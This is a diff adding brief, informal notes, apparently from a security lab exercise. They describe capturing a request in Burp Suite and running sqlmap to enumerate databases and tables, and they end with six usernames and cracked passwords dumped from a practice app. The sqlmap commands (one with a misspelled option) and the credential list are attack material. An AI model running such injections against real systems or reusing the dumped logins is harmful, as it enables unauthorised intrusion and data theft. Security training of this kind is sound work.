@@ -1,0 +1,11 @@
+at first I use burpsuit and everything that I need for that(such as foxy proxy) and then after all of this I move all the texts from 
+burpsuit into .txt files and at the end I can use sqlmap for it we use the command of : sqlmap -r inject.txt --dbs which it will search about 
+the possible data databases such as mysql nosql and etc,when it's done it will show all the injectables things, one of them is users then I
+use sqlmap -r inject.txt -D users --tabels and after a quit a time , everything is out and we can see users , user's real names and etc,
+However the passwords are in hashes which it has no problem, I used a site which it decoded the hashes . 
+username=admin,password=admin
+username=gordonb,password=abc123
+username=1337,password=charley
+username=pablo,password=letmein
+username=smithy,password=password
+username=user,password=user
